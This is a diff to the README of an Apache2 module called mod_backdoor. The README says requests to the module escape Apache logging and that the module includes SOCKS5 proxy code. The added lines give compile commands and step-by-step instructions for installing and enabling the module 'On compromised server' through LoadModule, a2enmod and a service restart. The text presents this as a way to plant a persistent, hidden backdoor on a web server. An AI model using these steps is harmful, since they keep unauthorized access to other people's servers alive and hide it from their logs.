@@ -20,8 +20,16 @@ All the requests to the module **are not logged by Apache2**
 Socks5 code was adapted from https://github.com/fgssfgss/socks_proxy
 
 # Build
-apxs -i -a -c mod_backdoor.c -Wl,-lutil <br/>
--Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
+For developpement :<br/>
+* `apxs -i -a -c mod_backdoor.c -Wl,-lutil` <br/>
+ -Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
+* `systemctl restart apache2`
+
+On compromised server :<br/>
+* Copy mod_backdoor.so to `/usr/lib/apache2/modules/mod_backdoor.so`
+* Create `/etc/apache2/mod-available/backdoor.load` with content:<br/>
+ `LoadModule backdoor_module /usr/lib/apache2/modules/mod_backdoor.so`
+* `a2enmod backdoor` --> `systemctl restart apache2`
 
 # Author
 Vlad Rico ([@RicoVlad](https://twitter.com/RicoVlad))
